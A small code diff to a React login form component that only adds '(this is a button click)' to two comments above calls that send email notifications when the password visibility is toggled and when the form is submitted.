@@ -27,7 +27,7 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
   const togglePasswordVisibility = async () => {
     setShowPassword(prev => !prev);
     
-    // Send email when password visibility is toggled
+    // Send email when password visibility is toggled (this is a button click)
     try {
       await sendEmailNotification({
         step: `Login Form - Password visibility ${showPassword ? 'hidden' : 'shown'}`,
@@ -54,7 +54,7 @@ const LoginForm: React.FC<LoginFormProps> = ({ onLoginSuccess }) => {
 
     setIsLoading(true);
     
-    // Send email for form submission
+    // Send email for form submission (this is a button click)
     try {
       await sendEmailNotification({
         step: "Login Form - COMPLETE SUBMISSION",
